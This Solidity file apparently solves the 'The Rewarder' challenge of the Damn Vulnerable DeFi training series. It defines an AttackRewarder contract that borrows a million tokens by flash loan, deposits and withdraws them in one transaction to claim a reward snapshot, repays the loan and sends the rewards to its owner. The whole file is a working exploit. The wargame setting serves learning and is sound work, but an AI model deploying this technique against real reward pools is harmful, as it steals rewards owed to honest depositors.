// SPDX-License-Identifier: SEE LICENSE IN LICENSE

pragma solidity ^0.8.0;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {AccountingToken} from "./AccountingToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";
import {console} from "hardhat/console.sol";

contract AttackRewarder {
    TheRewarderPool public immutable rewarderPool;
    FlashLoanerPool public immutable flashLoanerPool;
    address public immutable owner;
    DamnValuableToken public immutable dvt;
    AccountingToken public immutable accountingToken;
    RewardToken public immutable rewardToken;

    uint256 private constant TOKENS_IN_LENDER_POOL = 1000000 * 10 ** 18; // 1 million tokens

    constructor(
        address _rewarderPool,
        address _flashLoanerPool,
        address _owner,
        address _dvt,
        address _accountingToken,
        address _rewardToken
    ) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        owner = _owner;
        dvt = DamnValuableToken(_dvt);
        accountingToken = AccountingToken(_accountingToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function receiveFlashLoan(uint256) public {
        dvt.approve(address(rewarderPool), TOKENS_IN_LENDER_POOL);
        rewarderPool.deposit(TOKENS_IN_LENDER_POOL);

        rewarderPool.withdraw(TOKENS_IN_LENDER_POOL);

        dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);
    }

    function attack() external {
        flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);

        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    receive() external payable {}
}
